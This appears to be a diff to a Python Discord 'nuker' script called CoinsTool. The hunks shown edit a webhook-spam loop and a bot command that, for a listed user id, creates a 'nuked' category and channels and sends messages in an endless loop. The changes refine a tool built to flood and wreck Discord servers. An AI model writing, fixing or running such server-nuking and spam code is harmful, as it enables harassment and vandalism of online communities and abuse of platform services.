@@ -1,3 +1,4 @@
+category=""
 import os
 import time
 import json
@@ -79,7 +80,6 @@ def spam_webhook(webhook):
             if r.status_code == 204:
                 idk()
                 os.system(f"title (CoinsTool) Nuker - {x} messages sent")
-                #os.system(f"title Nuker - {x} Messages sent. | Coin's Tool")
             else:
                 print(f"{red}Rate Limit! {white}")
                 time.sleep(1)
@@ -95,7 +95,7 @@ async def create_channel(guild,name,cat):
     channel = await guild.create_text_channel(str(name),category=cat)
     await forever_send_msg(channel=channel)
 async def nuke(guild):
-    category = await guild.create_category("nuked")
+    global category
     await create_channel(guild=guild,name="nuked",cat=category)
 async def start_nuke(guild):
     while True:
@@ -106,11 +106,13 @@ async def on_ready():
 @bot.command()
 async def lol(ctx):
     global useridlol
+    global category
     print(useridlol)
     print(f"UserID: {ctx.author.id}")
     if str(ctx.author.id) in str(useridlol):
         guild = ctx.guild
         await ctx.send("starting nuke...")
+        category = await guild.create_category("nuked")
         await start_nuke(guild=guild)
     else:
         await ctx.send("no perms lol")
